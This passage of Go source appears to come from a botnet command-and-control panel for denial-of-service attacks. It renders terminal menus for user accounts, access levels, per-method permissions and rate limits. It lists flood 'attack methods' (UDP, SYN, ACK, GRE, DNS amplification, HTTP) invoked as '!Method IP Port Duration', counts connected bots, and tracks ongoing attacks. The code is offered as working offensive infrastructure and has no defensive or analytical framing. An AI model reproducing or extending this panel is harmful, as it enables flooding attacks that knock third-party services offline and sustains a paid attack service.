					conn.Write([]byte("\033[2J\033[H"))
					conn.Write([]byte("\033[3J\033[H\033[2J"))
					conn.Write([]byte("\x1b[?1049h\x1b[3J\x1b[H\x1b[2J\x1b[?25l"))
					conn.Write([]byte("\r\n"))
					conn.Write([]byte("\x1b[38;5;231m╭═══════════════════════════════════════════════╦══════════════════════════════╮\n\r"))
					conn.Write([]byte("\x1b[38;5;231m║             § \x1b[38;5;51mUser Deleted Successfully!\x1b[38;5;231m §    ║    ┌────────────────────┐    ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╣    │    USER REMOVED    │    ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m║ \x1b[38;5;45m● Account Removal Confirmation\x1b[38;5;231m                ║    │     ● DELETED      │    ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╣    └────────────────────┘    ║\n\r"))
					conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m Username: \x1b[38;5;45m%-30s\x1b[38;5;231m  ║    ░░░░░░░░░░░░░░░░░░░░░░    ║\r\n", username)))
					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m✪\x1b[38;5;231m Status:   \x1b[38;5;45mPERMANENTLY DELETED\x1b[38;5;231m             ║     ────────────────────     ║\r\n"))
					conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m Time:     \x1b[38;5;45m%-30s\x1b[38;5;231m  ║     ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒     ║\r\n", time.Now().Format("2006-01-02"))))
					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╬══════════════════════════════╣\n\r"))
					conn.Write([]byte("\x1b[38;5;231m║ \x1b[38;5;45m● Database Update\x1b[38;5;231m                             ║    ┌────────────────────┐    ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╣    │  RECORDS UPDATED   │    ║\n\r"))
					conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   \x1b[38;5;45m✪\x1b[38;5;231m Total Users: \x1b[38;5;45m%-26d\x1b[38;5;231m   ║    │     COMPLETE       │    ║\r\n", len(users))))
					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m Action:    \x1b[38;5;45mIRREVERSIBLE\x1b[38;5;231m                   ║    └────────────────────┘    ║\r\n"))
					conn.Write([]byte("\x1b[38;5;231m╰═══════════════════════════════════════════════╩══════════════════════════════╯\r\n"))
				case "users":
					usersFile, err := os.ReadFile("data/json/users.json")
					if err != nil {
						writeError(conn, "Reading users file.")
						continue
					}
					var users []User
					json.Unmarshal(usersFile, &users)
					var content []string
					for _, user := range users {
						line := fmt.Sprintf("User: %s ██ Level: %-8s ██ Expires: %s ",
							user.Username, user.Level, user.Expire.Format("2006-01-02"))
						content = append(content, line)
					}
					conn.Write([]byte("\033[2J\033[H"))
					conn.Write([]byte("\033[3J\033[H\033[2J"))
					conn.Write([]byte("\x1b[?1049h\x1b[3J\x1b[H\x1b[2J\x1b[?25l"))
					conn.Write([]byte("\r\n"))
					conn.Write([]byte("\x1b[38;5;231m╭═══════════════════════════════════════════════╦══════════════════════════════╮\n\r"))
					conn.Write([]byte("\x1b[38;5;231m║              § \x1b[38;5;51mRegistered Users\x1b[38;5;231m §             ║    ┌─┐ ┌─┐ ┌─┐ ┌─┐ ┌─┐       ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╣    │ │ │ │ │ │ │ │ │ │       ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m║ \x1b[38;5;45mUsername        Level     Expiration\x1b[38;5;231m          ║    └─┘ └─┘ └─┘ └─┘ └─┘       ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╩══════════╦═══════════════════╣\n\r"))

					// Display users with alternating bullets
					for i, line := range content {
						if len(line) > 76 {
							line = line[:76]
						}
						paddedLine := fmt.Sprintf("%-44s", line)
						bullet := "\x1b[38;5;45m❃"
						if i%2 == 0 {
							bullet = "\x1b[38;5;45m✪"
						}

						// Right side art that changes every few lines
						rightArt := "  USER DATABASE  "
						switch i % 2 {
						case 0:
							rightArt = "  ACCESS LEVELS  "
						}

						conn.Write([]byte("\x1b[38;5;231m║ " + bullet + " " + paddedLine + " \x1b[38;5;231m║ " + rightArt + " ║\n\r"))
					}

					conn.Write([]byte("\x1b[38;5;231m╠══════════════════════════════════════════════════════════╩═══════════════════╣\n\r"))
					conn.Write([]byte("\x1b[38;5;231m║                          \x1b[38;5;51mTotal Users: " + fmt.Sprintf("%-2d", len(users)) + "\x1b[38;5;231m                                     ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m╰══════════════════════════════════════════════════════════════════════════════╯\n\r"))
				case "methods", "?":
					conn.Write([]byte("\033[2J\033[H"))
					conn.Write([]byte("\033[3J\033[H\033[2J"))
					conn.Write([]byte("\x1b[?1049h\x1b[3J\x1b[H\x1b[2J\x1b[?25l"))
					conn.Write([]byte("\r\n"))
					conn.Write([]byte("\x1b[38;5;231m╭═══════════════════════════════════════════════╦══════════════════════════════╮\n\r"))
					conn.Write([]byte("\x1b[38;5;231m║                § \x1b[38;5;51mAttack Methods\x1b[38;5;231m §             ║ ●━━━━●━━━━●━━━●━━━●━━━●━━━━● ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m╠════════════════════╦══════════════════════════╢  │    │    │    │    │    │  ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;41m  Method Name    \x1b[38;5;231m║  \x1b[38;5;41m   Description          \x1b[38;5;231m║░░▒▒▓▓████▓▓▒▒░░▒▒▓▓████▓▓▒▒░░║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m╠════════════════════╬══════════════════════════╬══════════════════════════════╣\n\r"))
					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m❃. !udpsmart     \x1b[38;5;231m║ Simple UDP Bypass        ║ ╔══════════════════════════╗ ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m✪. !udpflood     \x1b[38;5;231m║ Basic UDP Flood          ║ ║        LAYER 4           ║ ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m❃. !tcpflood     \x1b[38;5;231m║ Basic TCP Flood          ║ ║     TCP/UDP/SCTP         ║ ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m✪. !synflood     \x1b[38;5;231m║ Basic SYN Flood          ║ ║                          ║ ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m❃. !ackflood     \x1b[38;5;231m║ Basic ACK Flood          ║ ╠══════════════════════════╣ ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m✪. !greflood     \x1b[38;5;231m║ Basic GRE Flood          ║ ║        LAYER 7           ║ ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m❃. !dns          \x1b[38;5;231m║ DNS Amplification        ║ ║    HTTP/HTTPS/DNS        ║ ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m✪. !http         \x1b[38;5;231m║ Simple HTTP Flood        ║ ╚══════════════════════════╝ ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m╠════════════════════╩══════════════════════════╢ ╔══════════════════════════╗ ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m║             § \x1b[38;5;51mUsage & Information\x1b[38;5;231m §           ║ ║ [1][2][3][4][5][6][7][8] ║ ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╯ ║  ●  ●  ○  ●  ○  ●  ○  ●  ║ ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m║  \x1b[38;5;45mEg.. !Method IP Port Duration ⚑  \x1b[38;5;231m              ║     PROTOCOL STATUS      ║ ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m║  \x1b[38;5;45mAll methods require parameters   \x1b[38;5;231m              ╚══════════════════════════╝ ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m╰══════════════════════════════════════════════════════════════════════════════╯\n\r"))
				case "rbac":
					if client.user.GetLevel() > Admin {
						writeError(conn, "Insufficient permissions.")
						continue
					}

					if len(parts) < 2 {
						// Show current RBAC configuration
						perms := GetMethodPermissions()
						conn.Write([]byte("\033[2J\033[H"))
						conn.Write([]byte("\033[3J\033[H\033[2J"))
						conn.Write([]byte("\x1b[?1049h\x1b[3J\x1b[H\x1b[2J\x1b[?25l"))
						conn.Write([]byte("\x1b[38;5;231m╭══════════════════════════════════════════════════════════════════════════════╮\n\r"))
						conn.Write([]byte("\x1b[38;5;231m║                          \x1b[38;5;51mRBAC Configuration\x1b[38;5;231m                                  ║\n\r"))
						conn.Write([]byte("\x1b[38;5;231m╠══════════════════════════════════════════════════════════════════════════════╢\n\r"))
						for method, levels := range perms {
							// Method name - 20 chars max
							displayMethod := method
							if len(displayMethod) > 20 {
								displayMethod = displayMethod[:17] + "..."
							}

							// Levels - 52 chars max (allows for longer level lists)
							levelsStr := strings.Join(levels, ", ")
							if len(levelsStr) > 52 {
								levelsStr = levelsStr[:49] + "..."
							}

							line := fmt.Sprintf("║  %-20s : %-52s ║", displayMethod, levelsStr)
							conn.Write([]byte(line + "\n\r"))
						}
						conn.Write([]byte("\x1b[38;5;231m╰══════════════════════════════════════════════════════════════════════════════╯\n\r"))
						continue
					}

					if len(parts) < 4 {
						writeError(conn, "Usage: rbac <method> <set|get> [levels...]")
						continue
					}

					method := parts[1]
					action := parts[2]

					switch action {
					case "get":
						perms := GetMethodPermissions()
						if levels, exists := perms[method]; exists {
							output := fmt.Sprintf("Method %s: %s", method, strings.Join(levels, ", "))
							conn.Write([]byte(output + "\n\r"))
						} else {
							writeError(conn, fmt.Sprintf("Method %s not found", method))
						}

					case "set":
						if len(parts) < 4 {
							writeError(conn, "Usage: rbac <method> set <level1> <level2> ...")
							continue
						}

						levels := parts[3:]
						validLevels := GetUserLevels()
						for _, level := range levels {
							valid := false
							for _, validLevel := range validLevels {
								if level == validLevel {
									valid = true
									break
								}
							}
							if !valid {
								writeError(conn, fmt.Sprintf("Invalid level: %s. Valid levels: %s", level, strings.Join(validLevels, ", ")))
								continue
							}
						}

						if err := SetMethodPermissions(method, levels); err != nil {
							writeError(conn, fmt.Sprintf("Error setting permissions: %v", err))
						} else {
							writeSuccess(conn, fmt.Sprintf("Permissions for %s updated successfully", method))
						}

					default:
						writeError(conn, "Invalid action. Use 'set' or 'get'")
					}
				case "userlevels":
					levels := GetUserLevels()
					conn.Write([]byte("Available user levels:\n\r"))
					for i, level := range levels {
						conn.Write([]byte(fmt.Sprintf("%d. %s\n\r", i+1, level)))
					}
				case "ratelimit":
					if len(parts) > 1 && parts[1] == "reset" && client.user.GetLevel() <= Admin {
						targetUser := client.user.Username
						if len(parts) > 2 {
							targetUser = parts[2]
						}
						ResetUserRateLimits(targetUser)
						writeSuccess(conn, fmt.Sprintf("Rate limits reset for %s", targetUser))
						continue
					}

					info := GetRateLimitInfo(client.user.Username)
					conn.Write([]byte("Rate Limit Status:\n\r"))
					for limitType, data := range info {
						limitData := data.(map[string]interface{})
						conn.Write([]byte(fmt.Sprintf("%s: %d remaining, blocked: %v\n\r",
							limitType, limitData["remaining"], limitData["blocked"])))
					}
				default:
					conn.Write([]byte("Invalid command. Type 'help' for available commands.\n\r"))
				}
			}
		}
	}
}

// Remove the global botCount and use connection pool size instead
func getBotCount() int {
	return int(atomic.LoadInt32(&connectionPool.currentSize))
}

func RecordAPIAttack(a Attack) string {
	id := fmt.Sprintf("%d-%s", time.Now().UnixNano(), a.user)
	apiAttackLock.Lock()
	ongoingAPIAttacks[id] = a
	apiAttackLock.Unlock()
	go func(id string, a Attack) {
		time.Sleep(a.duration)
		apiAttackLock.Lock()
		delete(ongoingAPIAttacks, id)
		apiAttackLock.Unlock()
	}(id, a)

	return id
}

func GetAllOngoingAttacks() []Attack {
	var combined []Attack

	attackLock.Lock()
	for _, a := range ongoingAttacks {
		if time.Now().Before(a.start.Add(a.duration)) {
			combined = append(combined, a)
		}
	}
	attackLock.Unlock()

	apiAttackLock.Lock()
	for _, a := range ongoingAPIAttacks {
		if time.Now().Before(a.start.Add(a.duration)) {
			combined = append(combined, a)
		}
	}
	apiAttackLock.Unlock()

	return combined
}
